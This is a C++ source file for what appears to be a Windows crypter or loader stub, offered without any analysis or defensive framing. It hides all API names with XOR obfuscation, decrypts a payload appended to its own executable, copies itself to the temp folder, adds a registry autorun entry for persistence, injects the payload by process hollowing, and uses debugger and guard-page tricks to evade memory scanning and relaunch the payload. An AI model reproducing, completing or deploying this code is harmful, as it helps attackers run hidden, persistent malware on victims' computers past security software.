#define _SCL_SECURE_NO_DEPRECATE
#define _CRT_SECURE_NO_DEPRECATE
#define WINVER 0x0500

#include <windows.h>
#include <stdio.h>
#include <stdexcept>

typedef FARPROC(WINAPI *T_GetProcAddress) (HMODULE hModule, LPCSTR  lpProcName);
typedef HMODULE(WINAPI *T_GetModuleHandleA) (LPCTSTR lpModuleName);
typedef BOOL(WINAPI *T_CreateProcess) (LPCTSTR               lpApplicationName,
   LPTSTR                lpCommandLine,
   LPSECURITY_ATTRIBUTES lpProcessAttributes,
   LPSECURITY_ATTRIBUTES lpThreadAttributes,
   BOOL                  bInheritHandles,
   DWORD                 dwCreationFlags,
   LPVOID                lpEnvironment,
   LPCTSTR               lpCurrentDirectory,
   LPSTARTUPINFO         lpStartupInfo,
   LPPROCESS_INFORMATION lpProcessInformation);

T_GetProcAddress pGetProcAddress;
T_GetModuleHandleA pGetModuleHandleA;
T_CreateProcess pCreateProcess;
void RunPe(LPSTR szFilePath, LPVOID pFile);

BYTE kernel32dllStr[] = { 105, 160, 124, 27, 251, 69, 148, 61, 29, 212, 179, 185, 0 };
char processPath[MAX_PATH + 1];
BYTE *payload;
BYTE *persist;
BOOL dotNet;

#define KEY "7151141015712021000214041270427217545140417005017411720411127777222505410511447544474117771147120471144174411054717512171512177477411117711220714471117147117742770272752177541752271545727217751151402712751124227740247114711745574714714551771171711414720471001574171551407251401177112440210744475402070444704755474421141401001741141020540441711717777415074747471115777141414111171111114154170114774142744441114721777715011111075051171204571414411147771014155515711250144274447741154222404251174425411412121471752115777217171427417727241441215410411544442101770225121124100217124741744511047444101714247471115401142154117477774207174112141147511024724417071514151515711541577547577074111450701110114214774415440255011121417201172277471774524470271475414717727411451717175174777071711722771104411240077127154212742401222752111152417754114471101514501747271744104477714271112127500721410571042211714401117245111475007152411421154727042014411777771012701774010257477547171227417111154771114011477124172754"


void Obf(BYTE *data, int dataSize)
{
   srand(0x1917);
   for (int i = 0; i < dataSize; ++i)
   {
      data[i] ^= KEY[i % (sizeof(KEY) - 1)];

      data[i] ^= rand();
      data[i] ^= 0;
   }
}

int CALLBACK WinMain(
   HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR     lpCmdLine,
   int       nCmdShow)
{
   Obf(kernel32dllStr, 12);

   BYTE loadLibaryAstr[] = { 110, 170, 111, 17, 210, 64, 197, 125, 82, 194, 166, 148, 0 };
   Obf(loadLibaryAstr, 12);
   typedef HMODULE(WINAPI *T_LoadLibrary) (LPCTSTR lpFileName);
   T_LoadLibrary pLoadLibraryA = (T_LoadLibrary)GetProcAddress(GetModuleHandleA((char *)kernel32dllStr), (char *)loadLibaryAstr);

   BYTE msvcrtStr[] = { 79, 182, 120, 22, 236, 93, 137, 107, 95, 220, 0 };
   Obf(msvcrtStr, 10);

   BYTE memcpyStr[] = { 79, 160, 99, 22, 238, 80, 0 };
   Obf(memcpyStr, 6);
   pLoadLibraryA((char *)msvcrtStr);
   typedef void(*T_memcpy) (void *dest, const void *src, size_t count);
   T_memcpy pMemcpy = (T_memcpy)GetProcAddress(GetModuleHandleA((char *)msvcrtStr), (char *)memcpyStr);

   BYTE getProcAddressStr[] = { 101, 160, 122, 37, 236, 70, 196, 78, 87, 212, 173, 176, 36, 150, 0 };
   Obf(getProcAddressStr, 14);
   pGetProcAddress = (T_GetProcAddress)GetProcAddress(GetModuleHandleA((char *)kernel32dllStr), (char *)getProcAddressStr);

   BYTE getModuleHandleAstr[] = { 101, 160, 122, 56, 241, 77, 210, 99, 86, 248, 190, 187, 51, 137, 75, 86, 0 };
   Obf(getModuleHandleAstr, 16);
   pGetModuleHandleA = (T_GetModuleHandleA)pGetProcAddress(GetModuleHandleA((char *)kernel32dllStr), (char *)getModuleHandleAstr);

   BYTE createProcessAstr[] = { 97, 183, 107, 20, 234, 76, 247, 125, 92, 211, 186, 166, 36, 164, 0 };
   Obf(createProcessAstr, 14);
   pCreateProcess = (T_CreateProcess)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)createProcessAstr);
   FILE *fp;
   char *file = "ok.txt";
   fp = fopen(file, "w");
   if (fp != NULL)
   {
      fclose(fp);
      DeleteFile(file);
      BYTE getModuleFileNameAstr[] = { 101, 160, 122, 56, 241, 77, 210, 99, 86, 246, 182, 185, 50, 171, 79, 122, 103, 216, 0 };
      Obf(getModuleFileNameAstr, 18);
      typedef DWORD(WINAPI *T_GetModuleFileNameA) (HMODULE hModule, LPTSTR  lpFilename, DWORD nSizeKD);
      T_GetModuleFileNameA pGetModuleFileNameA = (T_GetModuleFileNameA)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getModuleFileNameAstr);
      pGetModuleFileNameA(NULL, processPath, MAX_PATH);
      if (strcmp(GetCommandLine(), "-"))
      {

         STARTUPINFO si = { 0 };
         PROCESS_INFORMATION pi = { 0 };
         si.cb = sizeof(si);
         pCreateProcess(processPath, "-", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         return TRUE;
      }

      BYTE createFileAstr[] = { 97, 183, 107, 20, 234, 76, 225, 102, 95, 213, 158, 0 };
      Obf(createFileAstr, 11);
      typedef HANDLE(WINAPI *T_CreateFile) (
         LPCTSTR lpFileName,
         DWORD dwDesiredAccess,
         DWORD dwShareMode,
         LPSECURITY_ATTRIBUTES lpSecurityAttributes,
         DWORD dwCreationDisposition,
         DWORD dwFlagsAndAttributes,
         HANDLE hTemplateFile);
      T_CreateFile pCreateFileA = (T_CreateFile)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)createFileAstr);

      HANDLE file = pCreateFileA(processPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      DWORD length = GetFileSize(file, NULL);

      BYTE heapAllocStr[] = { 106, 160, 111, 5, 223, 69, 203, 96, 80, 0 };
      Obf(heapAllocStr, 9);
      typedef LPVOID(WINAPI *T_HeapAlloc) (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
      T_HeapAlloc pHeapAlloc = (T_HeapAlloc)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)heapAllocStr);

      BYTE getProcessHeapStr[] = { 101, 160, 122, 37, 236, 70, 196, 106, 64, 195, 151, 176, 54, 149, 0 };
      Obf(getProcessHeapStr, 14);
      typedef HANDLE(WINAPI *T_GetProcessHeap) (void);
      T_GetProcessHeap pGetProcessHeap = (T_GetProcessHeap)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getProcessHeapStr);

      BYTE *data = (BYTE *)pHeapAlloc(pGetProcessHeap(), 0, length);
      DWORD read;
      BYTE readFileStr[] = { 112, 160, 111, 17, 216, 64, 203, 106, 0 };
      Obf(readFileStr, 8);
      typedef BOOL(WINAPI *T_ReadFile) (HANDLE hFile,
         LPVOID lpBuffer,
         DWORD nNumberOfBytesToRead,
         LPDWORD lpNumberOfBytesRead,
         LPOVERLAPPED lpOverlapped);

      T_ReadFile pReadFile = (T_ReadFile)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)readFileStr);
      if (!pReadFile(file, data, length, &read, NULL))
      {
         STARTUPINFO si = { 0 };
         PROCESS_INFORMATION pi = { 0 };
         si.cb = sizeof(si);
         pCreateProcess(processPath, "", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         CloseHandle(file);
         return TRUE;
      }

      CloseHandle(file);
      BYTE *payloadOffset = data + read - sizeof(int);
      int delay;
      pMemcpy(&delay, payloadOffset, sizeof(int));

	  Sleep(delay);

      payloadOffset -= sizeof(int);

      pMemcpy(&dotNet, payloadOffset, sizeof(int));

      BOOL antis;
      payloadOffset -= sizeof(int);
      pMemcpy(&antis, payloadOffset, sizeof(int));
      const int strSize = 26;
      if (antis)
      {
        // if (IsInsideVMWare() || IsInsideVPC())
          //  return TRUE;

      }
      payloadOffset -= strSize;
      char keyName[strSize];
      pMemcpy(keyName, payloadOffset, strSize);
      Obf((BYTE *)keyName, strSize);

      payloadOffset -= strSize;
      char fileName[strSize];
      pMemcpy(fileName, payloadOffset, strSize);
      Obf((BYTE *)fileName, strSize);

	  payloadOffset -= sizeof(int);
	  pMemcpy(&persist, payloadOffset, sizeof(int));

      BOOL install;
      payloadOffset -= sizeof(int);
      pMemcpy(&install, payloadOffset, sizeof(int));

      BOOL melt;
      payloadOffset -= sizeof(int);
      pMemcpy(&melt, payloadOffset, sizeof(int));

	  install = melt; 


      if (install)
      {
         char installPath[MAX_PATH];

         BYTE getTempPathStr[] = { 101, 160, 122, 33, 251, 68, 215, 95, 82, 196, 183, 148, 0 };
         Obf(getTempPathStr, 12);

         typedef DWORD(WINAPI *T_GetTempPath) (DWORD nBufferLength, LPTSTR lpBuffer);
         T_GetTempPath pGetTempPath = (T_GetTempPath)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getTempPathStr);

         pGetTempPath(MAX_PATH, installPath);
         strcat(installPath, fileName);

         char *currFileName;
         for (int i = strlen(processPath); i > 0; i--)
         {
            if (installPath[i] == '\\')
            {
               currFileName = &processPath[i + 1];
               break;
            }
         }

         if (strcmp(fileName, currFileName))
         {
            CopyFile(processPath, installPath, FALSE);
            char zoneId[MAX_PATH + 1];
            strcpy(zoneId, installPath);
            strcat(zoneId, ":stm");
            DeleteFile(zoneId);
            LPVOID key;
            BYTE parentKeyName[] = { 113, 170, 104, 1, 233, 72, 213, 106, 111, 253, 182, 182, 37, 138, 93, 120, 100, 237, 71, 193, 125, 187, 21, 1, 62, 0, 155, 106, 157, 113, 140, 190, 236, 161, 155, 225, 229, 224, 45, 107, 198, 26, 122, 7, 216, 0 };
            Obf(parentKeyName, 45);

            BYTE advapi32dllStr[] = { 99, 161, 120, 20, 238, 64, 148, 61, 29, 212, 179, 185, 0 };
            Obf(advapi32dllStr, 12);
            pLoadLibraryA((char *)advapi32dllStr);

            BYTE regOpenKeyExAstr[] = { 112, 160, 105, 58, 238, 76, 201, 68, 86, 201, 154, 173, 22, 0 };
            Obf(regOpenKeyExAstr, 13);
            typedef LONG(WINAPI *T_RegOpenKeyExA) (HKEY hKey,
               LPCTSTR lpSubKey,
               DWORD ulOptions,
               REGSAM samDesired,
               PHKEY phkResult);

            T_RegOpenKeyExA pRegOpenKeyExA = (T_RegOpenKeyExA)pGetProcAddress(pGetModuleHandleA((char *)advapi32dllStr), (char *)regOpenKeyExAstr);
            pRegOpenKeyExA(HKEY_CURRENT_USER, (char *)parentKeyName, 0, KEY_ALL_ACCESS, (PHKEY)&key);
            BYTE regSetValueExAstr[] = { 112, 160, 105, 38, 251, 93, 241, 110, 95, 197, 186, 144, 47, 164, 0 };
            Obf(regSetValueExAstr, 14);

            typedef LONG(WINAPI *T_RegSetValueExA) (HKEY hKey,
               LPCTSTR lpValueName,
               DWORD Reserved,
               DWORD dwType,
               const BYTE *lpData,
               DWORD cbData);

            T_RegSetValueExA pRegSetValueExA = (T_RegSetValueExA)pGetProcAddress(pGetModuleHandleA((char *)advapi32dllStr), (char *)regSetValueExAstr);

            pRegSetValueExA((HKEY)key, keyName, 0, REG_SZ, (BYTE *)installPath, strlen(installPath) + 1);

            STARTUPINFO si = { 0 };
            PROCESS_INFORMATION pi;
            si.cb = sizeof(si);
            pCreateProcess(installPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

            if (melt)
            {
    /////////////  /     ///    BYTE prefixArg[] = { 13, 166, 46, 5, 247, 71, 192, 47, 2, 158, 238, 251, 102, 203, 31, 55, 47, 247, 59, 167, 52, 248, 6, 78, 124, 67, 247, 9, 206, 35, 154, 190, 238, 245, 239, 161, 228, 177, 0};
      //  /       Obf(prefixArg, 38);
      //         char arg[MAX_PATH + 1];
     //          sprintf(arg, (char *)prefixArg, processPath);

    ///           BYTE shell32dllStr[] = { 81, 173, 107, 25, 242, 26, 149, 33, 87, 220, 179, 0 };
        ///       BYTE shellExecuteAstr[] = { 113, 173, 107, 25, 242, 108, 223, 106, 80, 197, 171, 176, 22, 0 };
     //          Obf(shellExecuteAstr, 13);
    //           pLoadLibraryA((char *)shell32dllStr);
     ///////////////          typedef HINSTANCE(*T_ShellExecute) (HWND hwnd,
     ///////////             LPCTSTR lpOperation,
    ////////////              LPCTSTR lpFile,
    ////////////              LPCTSTR lpParameters,
   //////////////////////////               LPCTSTR lpDirectory,
       //////////           INT nShowCmd);
       /////////////        T_ShellExecute pShellExecuteA = (T_ShellExecute)pGetProcAddress(pGetModuleHandleA((char *)shell32dllStr), (char *)shellExecuteAstr);
	   /////////////////////
      //////////////////////    //     BYTE cmdStr[] = { 65, 168, 106, 91, 251, 81, 194, 0 };
     ///////////          Obf(cmdStr, 7);
    ///////////////           BYTE openStr[] = { 77, 181, 107, 27, 0 };
   ///////////////            Obf(openStr, 4);

			   //      pShellExecuteA(NULL, (char *)openStr, (char *)cmdStr, arg, NULL, SW_HIDE);
         }

            return TRUE;
         }
      }

      int payloadSize;
      payloadOffset -= sizeof(int);
      pMemcpy(&payloadSize, payloadOffset, sizeof(int));

      payloadOffset -= payloadSize;
      payload = (BYTE *)malloc(payloadSize);
      pMemcpy(payload, payloadOffset, payloadSize);
      Obf(payload, payloadSize);
      if (dotNet)
      {
         BYTE getWindowsDirectoryAstr[] = { 101, 160, 122, 34, 247, 71, 195, 96, 68, 195, 155, 188, 37, 128, 77, 99, 109, 235, 98, 215, 0 };
         Obf(getWindowsDirectoryAstr, 20);
         typedef UINT(WINAPI *T_GetWindowsDirectoryA) (LPTSTR lpBuffer, UINT uSize);
         T_GetWindowsDirectoryA pGetWindowsDirectoryA = (T_GetWindowsDirectoryA)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getWindowsDirectoryAstr);
         char vbcPath[MAX_PATH + 1];
         pGetWindowsDirectoryA(vbcPath, MAX_PATH);
         BYTE pathPart[] = { 126, 136, 103, 22, 236, 70, 212, 96, 85, 196, 241, 155, 18, 177, 114, 81, 112, 248, 118, 243, 99, 186, 3, 5, 21, 5, 245, 7, 216, 45, 203, 235, 181, 231, 250, 216, 218, 192, 6, 113, 193, 42, 76, 92, 211, 143, 54, 0 };
         Obf(pathPart, 47);
         strcat(vbcPath, (char *)pathPart);

         RunPe(vbcPath, payload);
      }
      else
         RunPe(processPath, payload);

   }
   else
      fclose(fp);
   return TRUE;
}

void RunPe(LPSTR szFilePath, LPVOID pFile)
{
   BYTE ntdllStr[] = { 108, 177, 106, 25, 242, 7, 195, 99, 95, 0 };
   Obf((BYTE *)ntdllStr, 9);

   BYTE ntUnmapViewOfSectionStr[] = { 108, 177, 91, 27, 243, 72, 215, 89, 90, 213, 168, 154, 49, 182, 75, 116, 118, 240, 116, 248, 0 };
   Obf(ntUnmapViewOfSectionStr, 20);
   typedef LONG(WINAPI *NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

   PIMAGE_DOS_HEADER IDH;
   PIMAGE_NT_HEADERS INH;
   PIMAGE_SECTION_HEADER ISH;
   PROCESS_INFORMATION PI = { 0 };
   STARTUPINFOA SI = { 0 };
   PCONTEXT CTX;
   PDWORD dwImageBase;
   NtUnmapViewOfSection xNtUnmapViewOfSection;
   LPVOID pImageBase;
   int Count;

   BYTE virtualAllocStr[] = { 116, 172, 124, 1, 235, 72, 203, 78, 95, 220, 176, 182, 0 };
   Obf(virtualAllocStr, 12);
   typedef LPVOID(WINAPI *T_VirtualAlloc) (LPVOID lpAddress,
      SIZE_T dwSize,
      DWORD  flAllocationType,
      DWORD  flProtect);
   T_VirtualAlloc pVirtualAlloc = (T_VirtualAlloc)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)virtualAllocStr);

   BYTE readProcessMemoryStr[] = { 112, 160, 111, 17, 206, 91, 200, 108, 86, 195, 172, 152, 50, 136, 65, 101, 123, 0 };
   Obf(readProcessMemoryStr, 17);
   typedef BOOL(WINAPI *T_ReadProcessMemory) (HANDLE  hProcess,
      LPCVOID lpBaseAddress,
      LPVOID  lpBuffer,
      SIZE_T  nSize,
      SIZE_T  *lpNumberOfBytesRead);
   T_ReadProcessMemory pReadProcessMemory = (T_ReadProcessMemory)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)readProcessMemoryStr);

   BYTE getThreadContextStr[] = { 101, 160, 122, 33, 246, 91, 194, 110, 87, 243, 176, 187, 35, 128, 86, 99, 0 };
   Obf(getThreadContextStr, 16);

   typedef BOOL(WINAPI *T_GetThreadContext) (HANDLE hThread, LPCONTEXT lpContext);
   T_GetThreadContext pGetThreadContext = (T_GetThreadContext)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getThreadContextStr);


   BYTE virtualAllocExStr[] = { 116, 172, 124, 1, 235, 72, 203, 78, 95, 220, 176, 182, 18, 157, 0 };
   Obf(virtualAllocExStr, 14);
   typedef LPVOID(WINAPI *T_VirtualAllocEx) (HANDLE hProcess,
      LPVOID lpAddress,
      SIZE_T dwSize,
      DWORD  flAllocationType,
      DWORD  flProtect);
   T_VirtualAllocEx pVirtualAllocEx = (T_VirtualAllocEx)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)virtualAllocExStr);

   BYTE virtualFreeStr[] = { 116, 172, 124, 1, 235, 72, 203, 73, 65, 213, 186, 0 };
   Obf(virtualFreeStr, 11);
   typedef BOOL(WINAPI *T_VirtualFree) (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
   T_VirtualFree pVirtualFree = (T_VirtualFree)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)virtualFreeStr);

   BYTE setThreadContextStr[] = { 113, 160, 122, 33, 246, 91, 194, 110, 87, 243, 176, 187, 35, 128, 86, 99, 0 };
   Obf(setThreadContextStr, 16);
   typedef BOOL(WINAPI *T_SetThreadContext) (HANDLE  hThread, CONTEXT *lpContext);
   T_SetThreadContext pSetThreadContext = (T_SetThreadContext)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)setThreadContextStr);

   BYTE resumeThreadStr[] = { 112, 160, 125, 0, 243, 76, 243, 103, 65, 213, 190, 177, 0 };
   Obf(resumeThreadStr, 12);
   typedef DWORD(WINAPI *T_ResumeThread) (HANDLE hThread);
   T_ResumeThread pResumeThread = (T_ResumeThread)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)resumeThreadStr);

   BYTE writeProcessMemoryStr[] = { 117, 183, 103, 1, 251, 121, 213, 96, 80, 213, 172, 166, 26, 128, 67, 120, 112, 224, 0 };
   Obf(writeProcessMemoryStr, 18);
   typedef BOOL(WINAPI *T_WriteProcessMemory) (HANDLE  hProcess,
      LPVOID  lpBaseAddress,
      LPCVOID lpBuffer,
      SIZE_T  nSize,
      SIZE_T  *lpNumberOfBytesWritten);
   T_WriteProcessMemory pWriteProcessMemory = (T_WriteProcessMemory)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)writeProcessMemoryStr);

   IDH = PIMAGE_DOS_HEADER(pFile);
   if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
   {

      INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
      if (INH->Signature == IMAGE_NT_SIGNATURE)
      {

		  if (pCreateProcess(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED + CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &SI, &PI))
         {
            CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
            CTX->ContextFlags = CONTEXT_FULL;

            if (pGetThreadContext(PI.hThread, LPCONTEXT(CTX)))
            {
               pReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);

               if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
               {
                  xNtUnmapViewOfSection = NtUnmapViewOfSection(pGetProcAddress(pGetModuleHandleA((char *)ntdllStr), (char *)ntUnmapViewOfSectionStr));
                  xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
               }
               pImageBase = pVirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
               if (pImageBase)
               {
                  pWriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
                  for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
                  {

                     ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
                     pWriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
                  }
                  pWriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
                  CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
                  pSetThreadContext(PI.hThread, LPCONTEXT(CTX));

				  void AntiMemScan(PROCESS_INFORMATION PI, PIMAGE_NT_HEADERS INH, LPVOID pImageBase);
				  AntiMemScan(PI, INH, pImageBase);
				  pResumeThread(PI.hThread);
				  Sleep(5000);
			   }
			   else
			   {
				   TerminateProcess(PI.hProcess, 0);
				   STARTUPINFO si = { 0 };
				   PROCESS_INFORMATION pi = { 0 };
				   si.cb = sizeof(si);
				   pCreateProcess(processPath, "-", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
				   ExitProcess(0);
			   }
			}
		  }

	  }
   }

   pVirtualFree(pFile, 0, MEM_RELEASE);
}


void Persistance(PROCESS_INFORMATION PI)
{
	if (persist)
	{

		if (dotNet)
		{
		//	BYTE getWindowsDirectoryAstr[] = { 101, 160, 122, 34, 247, 71, 195, 96, 68, 195, 155, 188, 37, 128, 77, 99, 109, 235, 98, 215, 0 };
			//Obf(getWindowsDirectoryAstr, 20);
		//	typedef UINT(WINAPI *T_GetWindowsDirectoryA) (LPTSTR lpBuffer, UINT uSize);
		///	T_GetWindowsDirectoryA pGetWindowsDirectoryA = (T_GetWindowsDirectoryA)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)getWindowsDirectoryAstr);
	//		char vbcPath[MAX_PATH + 1];
	//		pGetWindowsDirectoryA(vbcPath, MAX_PATH);
	//		BYTE pathPart[] = { 126, 136, 103, 22, 236, 70, 212, 96, 85, 196, 241, 155, 18, 177, 114, 81, 112, 248, 118, 243, 99, 186, 3, 5, 21, 5, 245, 7, 216, 45, 203, 235, 181, 231, 250, 216, 218, 192, 6, 113, 193, 42, 76, 92, 211, 143, 54, 0 };
	//		Obf(pathPart, 47);
	//		strcat(vbcPath, (char *)pathPart);

//			RunPe(vbcPath, payload);
		}
		else
			RunPe(processPath, payload);

	}
	else
	{
		ExitProcess(0);
	}

}

void AntiMemScan(PROCESS_INFORMATION PI, PIMAGE_NT_HEADERS INH, LPVOID pImageBase)
{

	if (dotNet)
	{

	}
	else
	{
		BYTE ntdllStr[] = { 108, 177, 106, 25, 242, 7, 195, 99, 95, 0 };
		Obf((BYTE *)ntdllStr, 9);

		BYTE NtResumeThreadStr[] = { 108, 177, 92, 16, 237, 92, 202, 106, 103, 216, 173, 176, 54, 129, 0 };
		Obf(NtResumeThreadStr, 14);
		typedef NTSTATUS(WINAPI *T_NtResumeThread)(IN HANDLE ThreadHandle);
		T_NtResumeThread pNtResumeThread = (T_NtResumeThread)pGetProcAddress(pGetModuleHandleA((char *)ntdllStr), (char *)NtResumeThreadStr);

		BYTE resumeThreadStr[] = { 112, 160, 125, 0, 243, 76, 243, 103, 65, 213, 190, 177, 0 };
		Obf(resumeThreadStr, 12);
		typedef DWORD(WINAPI *T_ResumeThread) (HANDLE hThread);
		T_ResumeThread pResumeThread = (T_ResumeThread)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)resumeThreadStr);

		BYTE DebugActiveProcessStr[] = { 102, 160, 108, 0, 249, 104, 196, 123, 90, 198, 186, 133, 37, 138, 77, 114, 113, 234, 0 };
		Obf(DebugActiveProcessStr, 18);
		typedef BOOL(WINAPI *T_DebugActiveProcess)(DWORD dwProcessId);
		T_DebugActiveProcess pDebugActiveProcess = (T_DebugActiveProcess)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)DebugActiveProcessStr);

		BYTE WaitForDebugEventStr[] = { 117, 164, 103, 1, 216, 70, 213, 75, 86, 210, 170, 178, 18, 147, 75, 121, 118, 0 };
		Obf(WaitForDebugEventStr, 17);
		typedef BOOL(WINAPI *T_WaitForDebugEvent)(LPDEBUG_EVENT lpDebugEvent, DWORD dwMilliseconds);
		T_WaitForDebugEvent pWaitForDebugEvent = (T_WaitForDebugEvent)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)WaitForDebugEventStr);

		BYTE VirtualProtectExStr[] = { 116, 172, 124, 1, 235, 72, 203, 95, 65, 223, 171, 176, 52, 145, 107, 111, 0 };
		Obf(VirtualProtectExStr, 16);
		typedef BOOL(WINAPI *T_VirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
		T_VirtualProtectEx pVirtualProtectEx = (T_VirtualProtectEx)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)VirtualProtectExStr);

		BYTE ContinueDebugEventStr[] = { 97, 170, 96, 1, 247, 71, 210, 106, 119, 213, 189, 160, 48, 160, 88, 114, 108, 237, 0 };
		Obf(ContinueDebugEventStr, 18);
		typedef BOOL(WINAPI *T_ContinueDebugEvent)(DWORD dwProcessId, DWORD dwThreadId, DWORD dwContinueStatus);
		T_ContinueDebugEvent pContinueDebugEvent = (T_ContinueDebugEvent)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)ContinueDebugEventStr);

		BYTE DebugActiveProcessStopStr[] = { 102, 160, 108, 0, 249, 104, 196, 123, 90, 198, 186, 133, 37, 138, 77, 114, 113, 234, 72, 226, 123, 165, 0 };
		Obf(DebugActiveProcessStopStr, 22);
		typedef BOOL(WINAPI *T_DebugActiveProcessStop)(DWORD dwProcessId);
		T_DebugActiveProcessStop pDebugActiveProcessStop = (T_DebugActiveProcessStop)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)DebugActiveProcessStopStr);

		BYTE TerminateProcessStr[] = { 118, 160, 124, 24, 247, 71, 198, 123, 86, 224, 173, 186, 52, 128, 93, 100, 0 };
		Obf(TerminateProcessStr, 16);
		typedef BOOL(WINAPI *T_TerminateProcess)(HANDLE hProcess, UINT uExitCode);
		T_TerminateProcess pTerminateProcess = (T_TerminateProcess)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)TerminateProcessStr);


		pDebugActiveProcess(DWORD(PI.dwProcessId));
		DEBUG_EVENT evt = { 0 };

		while (true)
		{

			pWaitForDebugEvent(&evt, INFINITE);

			switch (evt.dwDebugEventCode)
			{

			case CREATE_PROCESS_DEBUG_EVENT:
				DWORD back;

				try {
					pVirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfHeaders, PAGE_GUARD + PAGE_EXECUTE_READWRITE, &back);
				}
				catch (int o) {
					pVirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfHeaders, PAGE_GUARD + PAGE_EXECUTE_READWRITE, &back);
				}
				pResumeThread(PI.hThread);
				Sleep(1000);
				pContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, DBG_CONTINUE);
				break;
			case EXCEPTION_DEBUG_EVENT:

				if (evt.u.Exception.ExceptionRecord.ExceptionCode == STATUS_GUARD_PAGE_VIOLATION){
					pContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, DBG_CONTINUE);
					try {
						pVirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfHeaders, PAGE_GUARD + PAGE_EXECUTE_READWRITE, &back);
					}
					catch (int o) {
						pVirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfHeaders, PAGE_GUARD + PAGE_EXECUTE_READWRITE, &back);
					}
				}
				pContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, DBG_CONTINUE);
				break;
			case EXIT_PROCESS_DEBUG_EVENT:
				pDebugActiveProcessStop(PI.dwProcessId);
				pTerminateProcess(PI.hThread, 0);
				Persistance(PI);
				break;


			default:
				pContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, DBG_CONTINUE);
				break;
			}

		}
	} 
}
